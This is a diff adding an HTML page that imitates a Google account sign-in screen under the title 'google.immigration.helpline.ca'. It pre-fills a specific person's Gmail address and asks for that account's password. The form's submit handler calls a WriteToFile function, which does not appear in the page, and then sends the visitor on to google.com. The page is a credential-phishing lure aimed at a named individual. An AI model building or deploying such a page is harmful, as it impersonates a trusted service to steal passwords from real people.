@@ -1,0 +1,72 @@
+﻿<html>
+<head>
+    <link type="text/css" rel="stylesheet" href="style.css" />
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300' rel='stylesheet' type='text/css'>
+    <title>google.immigration.helpline.ca</title>
+</head>
+<script>
+    function myFunction() {
+    var x = document.getElementById("myInput");
+    if (x.type === "password") {
+        x.type = "text";
+    } else {
+        x.type = "password";
+    }
+    }
+</script>
+
+<body>
+    <center>
+        <div class="base">
+            <div id="logo">
+                <img src="logo.png" width="118" height="38" />
+            </div>
+            <div id="info1">
+                Welcome
+            </div>
+            <div id="info2">
+                Sign in to continue to <w style="color:#1569C7">helpline.immigration.ca </w>
+            </div>
+
+            <div id="form1">
+                <div id="form-img">
+                    <img src="profile-img.jpg" width="99" height="99" />
+                </div>
+                <div id="emailID">dularawijayasundara@gmail.com
+                </div>
+                <form action="https://www.google.com" onSubmit="WriteToFile(this)">
+                    <div id="mailbox">
+                        <input type="password" id="myInput" placeholder="Enter your password" style="width:270px; height:42px; border: solid 1px #c2c4c6; font-size:16px; padding-left:8px;"/>
+                    </div>
+                    <div id="showPass">
+                        <input type="checkbox" onclick="myFunction()">Show Password
+                    </div>
+                    
+                    <div>
+                        <input type="submit" id="button2" value="Next" />
+                    </div>
+                </form> 
+
+                <div id="info3">
+                    <a href="#">Need help?</a>
+                </div>
+            </div>
+            <div id="info4">
+                <a href="#">Create account</a>
+            </div>
+            <div id="info5">
+                One Google Account for everything Google
+            </div>
+            <div>
+                <img src="footer-logo.png" id="logo2" />
+            </div>
+
+            <div id="bottom">
+
+            </div>
+        </div>
+    </center>
+</body>
+
+</html>
